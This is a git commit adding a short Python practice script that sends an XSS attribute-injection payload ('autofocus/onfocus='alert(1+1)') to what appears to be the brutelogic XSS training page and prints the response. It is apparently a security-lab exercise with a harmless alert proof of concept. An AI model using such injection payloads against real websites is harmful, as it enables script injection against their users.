9133f3e420df9fa4c9bcd121779ee0f6cfd95007
Nguyen Diep Anh <102238853+Weep2609@users.noreply.github.com>
2023-02-27 22:12:06 +0700

    Update exercise_09.py

--- brutelogic_lab/exercise_09.py
+++ brutelogic_lab/exercise_09.py
@@ -1,1 +1,13 @@
+#!/usr/bin/python3
+import requests
 
+url = 'https://brutelogic.com.br/gym.php'
+
+payload = "'autofocus/onfocus='alert(1+1)"
+
+params = {'p09': payload}
+
+r = requests.get(url, params=params)
+
+print(r.text)
+print(r.url)
